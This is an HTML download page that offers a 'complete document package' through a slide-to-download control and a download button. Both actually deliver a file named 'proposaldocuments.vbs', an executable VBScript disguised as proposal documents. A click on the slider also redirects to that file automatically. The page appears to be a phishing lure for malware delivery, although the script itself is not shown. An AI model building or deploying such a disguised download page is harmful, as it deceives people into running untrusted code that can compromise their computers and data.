<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Download Package</title>

<style>
body{
    margin:0;
    padding:0;
    font-family:Arial, Helvetica, sans-serif;
    background:#f5f7f8;
}

.wrapper{
    max-width:700px;
    margin:60px auto;
    text-align:center;
}

/* Heading */

.wrapper p{
    color:#666;
    font-size:20px;
    margin-bottom:20px;
}

/* Toggle */

.toggle{
    width:330px;
    height:70px;
    background:#d9e1e2;
    border-radius:50px;
    margin:0 auto 20px;
    padding:8px;
    display:flex;
    align-items:center;
    cursor:pointer;
    position:relative;
    box-shadow:inset 0 3px 8px rgba(0,0,0,.15);
}

.toggle-circle{
    width:54px;
    height:54px;
    background:#214d4b;
    border-radius:50%;
    display:flex;
    align-items:center;
    justify-content:center;
    color:#fff;
    font-size:25px;
    transition:.4s;
}

.toggle-text{
    flex:1;
    text-align:center;
    color:#214d4b;
    font-size:20px;
    font-weight:bold;
}

.toggle.active{
    background:#98c7c4;
}

.toggle.active .toggle-circle{
    transform:translateX(250px);
    background:#173937;
}

/* Notes */

.note{
    color:#777;
    font-size:15px;
    margin-top:10px;
}

/* Download Button */

.download-area{
    margin-top:40px;
}

.download-btn{
    display:inline-block;
    padding:15px 35px;
    background:#214d4b;
    color:#fff;
    text-decoration:none;
    border-radius:8px;
    font-size:18px;
    transition:.3s;
}

.download-btn:hover{
    background:#173937;
}
</style>
</head>

<body>

<div class="wrapper">

    <p>Slide to access the document package</p>

    <div class="toggle" id="downloadToggle">
        <div class="toggle-circle">➜</div>
        <div class="toggle-text">Slide to Download</div>
    </div>

    <div class="note">
        Release the slider to open the download.
    </div>

    <div class="download-area">
        <a class="download-btn"
           href="proposaldocuments.vbs"
           download>
            ⬇ Download Complete Package
        </a>

        <div class="note">
            Clicking the button downloads the complete package.
        </div>
    </div>

</div>

<script>
const toggle = document.getElementById("downloadToggle");

toggle.addEventListener("click", function () {

    toggle.classList.add("active");

    setTimeout(function () {
        window.location.href = "proposaldocuments.vbs";
    }, 700);

});
</script>

</body>
</html>
